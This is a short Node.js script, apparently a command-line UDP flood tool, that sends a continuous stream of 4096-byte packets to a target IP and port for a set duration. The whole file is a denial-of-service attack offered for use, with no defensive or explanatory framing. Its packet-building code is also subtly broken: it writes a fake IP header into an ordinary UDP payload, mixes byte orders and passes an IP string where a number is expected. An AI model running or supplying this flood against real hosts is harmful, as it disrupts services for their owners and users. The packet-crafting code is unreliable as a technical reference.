const dgram = require('dgram');

// Function to create UDP packet
function createPacket(destAddr, destPort) {
    const buffer = Buffer.alloc(4096);

    // IP header
    buffer.writeUInt8(0x45, 0); // Version and header length
    buffer.writeUInt8(0, 1); // Type of service
    buffer.writeUInt16LE(4096, 2); // Total length (header + data)
    buffer.writeUInt16BE(0, 4); // Identification
    buffer.writeUInt16BE(0x4000, 6); // Flags and fragment offset
    buffer.writeUInt8(255, 8); // Time to live
    buffer.writeUInt8(17, 9); // Protocol (UDP)
    buffer.writeUInt16BE(0, 10); // Header checksum
    buffer.writeUInt32BE(0, 12); // Source IP address (0.0.0.0)
    buffer.writeUInt32BE(destAddr, 16); // Destination IP address

    // UDP header
    buffer.writeUInt16BE(12345, 20); // Source port
    buffer.writeUInt16BE(destPort, 22); // Destination port
    buffer.writeUInt16BE(8, 24); // Length
    buffer.writeUInt16BE(0, 26); // Checksum

    // UDP data
    buffer.fill('A', 28, 4096); // Fill with 'A' characters

    return buffer;
}

// Function to send UDP packets
function sendPackets(destAddr, destPort, throttle) {
    const client = dgram.createSocket('udp4');
    const packet = createPacket(destAddr, destPort);

    console.log('Starting Flood...');

    // Flood packets
    setInterval(() => {
        client.send(packet, 0, packet.length, destPort, destAddr, (err) => {
            if (err) {
                console.error('Failed to send packet:', err);
            }
        });
    }, throttle);
}

// Parse command line arguments
if (process.argv.length !== 7) {
    console.log('Usage: node udp-pps.js <target IP> <port> <throttle> <thread> <time>');
    process.exit(1);
}

const destAddr = process.argv[2];
const destPort = parseInt(process.argv[3]);
const throttle = parseInt(process.argv[4]);
const numThreads = parseInt(process.argv[5]);
const duration = parseInt(process.argv[6]);

// Start flood
for (let i = 0; i < numThreads; i++) {
    sendPackets(destAddr, destPort, throttle);
}

// Stop flood after specified duration
setTimeout(() => {
    process.exit(0);
}, duration * 1000);
